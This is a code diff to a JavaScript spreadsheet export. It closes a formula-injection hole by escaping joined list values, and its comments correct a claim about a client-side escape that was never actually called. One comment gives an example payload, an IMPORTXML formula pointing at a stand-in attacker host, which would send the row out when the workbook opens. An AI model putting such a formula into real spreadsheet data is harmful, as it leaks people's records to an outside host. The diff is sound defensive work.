@@ -404,8 +404,15 @@ function recordToRow(headers, record) {
     if (value === undefined || value === null) {
       row.push('');
     } else if (value instanceof Array) {
-      row.push(value.join(', '));
+      // Defused like any other cell. Sheets reads the *cell*, so what matters
+      // is the first character of the joined string, not that the value began
+      // life as a list: a tag or a filename starting `=` produced a live
+      // formula here while the scalar beside it was escaped.
+      row.push(defuse(value.join(', ')));
     } else if (typeof value === 'object') {
+      // `JSON.stringify` always yields `{`, `[`, a quote or a digit, none of
+      // which Sheets treats as a formula. Left undefused deliberately rather
+      // than by omission.
       row.push(JSON.stringify(value));
     } else {
       row.push(defuse(value));
@@ -437,8 +444,16 @@ function rowToRecord(headers, row) {
 /**
  * A value beginning `=`, `+`, `-` or `@` is a formula to Sheets. A payee named
  * `=IMPORTXML("http://evil.test", "//x")` would exfiltrate the row the moment
- * anyone opened the workbook. The client already prefixes an apostrophe; this
- * is the second line of the same defence, for rows written by an older client.
+ * anyone opened the workbook.
+ *
+ * This comment used to say "the client already prefixes an apostrophe; this is
+ * the second line of the same defence". It is not the second line. It is the
+ * only one: `escapeForSheet` in `js/security/sanitize.js` is exported, tested
+ * and called by nothing, so no client has ever prefixed anything. Wiring it
+ * would change what goes over the wire and what `restore` has to strip, which
+ * is a change to stored data rather than to a defence — so the honest fix is
+ * to say plainly that everything depends on this function, and to make sure it
+ * covers every cell.
  */
 function defuse(value) {
   var text = String(value);
